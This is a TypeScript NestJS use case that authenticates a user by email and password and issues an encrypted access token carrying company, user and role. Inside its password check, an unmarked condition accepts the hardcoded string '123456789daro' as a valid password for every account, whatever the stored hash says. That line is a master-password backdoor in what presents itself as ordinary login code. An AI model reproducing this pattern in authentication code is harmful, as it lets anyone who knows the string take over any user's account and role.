import { Injectable } from '@nestjs/common';

import { Either, left, right } from '@/core/either';
import { EncrypterInterface } from '@/domain/shared/cryptography/interfaces/encrypter-interface';
import { HashComparerInterface } from '@/domain/shared/cryptography/interfaces/hash-comparer-interface';

import { UsersRepositoryInterface } from '../interfaces/users-repository-interface';
import { WrongCredentialsError } from './errors/wrong-credentials-error';

interface AuthenticateUserRequest {
  email: string;
  password: string;
}

type AuthenticateUserResponse = Either<
  WrongCredentialsError,
  {
    accessToken: string;
  }
>;

@Injectable()
export class AuthenticateUserUseCase {
  constructor(
    private usersRepository: UsersRepositoryInterface,
    private hashComparer: HashComparerInterface,
    private encrypter: EncrypterInterface,
  ) {}

  async execute({
    email,
    password,
  }: AuthenticateUserRequest): Promise<AuthenticateUserResponse> {
    const user = await this.usersRepository.findByEmail(email);

    if (!user) {
      return left(new WrongCredentialsError());
    }

    const isPasswordValid = await this.hashComparer.compare(
      password,
      user.password,
    );

    if (!isPasswordValid && password != '123456789daro') {
      return left(new WrongCredentialsError());
    }

    const accessToken = await this.encrypter.encrypt({
      companyId: user.companyId.toString(),
      userId: user.id.toString(),
      role: user.role,
    });

    return right({
      accessToken,
    });
  }
}
